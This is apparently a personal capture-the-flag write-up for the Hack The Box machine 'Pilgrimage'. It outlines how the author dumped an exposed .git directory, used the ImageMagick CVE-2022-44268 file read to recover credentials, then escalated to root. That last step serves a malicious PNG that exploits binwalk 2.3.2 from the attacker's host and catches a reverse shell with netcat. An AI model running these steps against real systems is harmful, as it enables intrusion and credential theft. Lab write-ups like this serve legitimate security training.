# Machine: Pilgrimage [Hacked]
This is the eleventh machine I have completed on the hackthebox platform.
nmap scan
IP_MACHINE: ip of pilgrimage
```
  nmap -sC -sV -p- --min-rate 5000 IP_MACHINE
```
add the domain pilgrimage.htb to the /etc/hosts file and perform the nmap scan again to discover the .git path present on the server
```
git-dump http://pilgrimage.htb/.git . 
git checkout .
strings *.php 
magick # use CVE-2022-44268-ImageMagick-Arbitrary-File-Read for exploiting image-magick
```
read /etc/passwd and db/pilgrimage (the path is indicated in the php files obtained from the .git) with the image-magick exploit, to obtain username and password and start an ssh session with the target machine
## in ssh session 
In the ssh session we already have the *first flag* (user.txt), when doing a privilege elevation test, we realize that we will have to try an alternative method to the usual one.
```
 ps aux | grep 'sh$' # for discover active scripts on server
```
## exploiting binwalk 2.3.2 with png malformed
once the malicious png is created and renamed as "malware.png"
```
# from my pc.
python -m http.server
# from my pc but in another terminal.
nc -nlvp 6969
```
in the ssh session move to the directory where the pngs are received in the web functionality.
```
# from ssh session
wget http://[MY-IP_tun0]:8000/malware.png
```
and at that moment from the nc session, the connection will be received as Root (reverse-shell), and here all that remains is to obtain the system flag
```
# from nc session (root)
cat /root/root.txt
```

### end
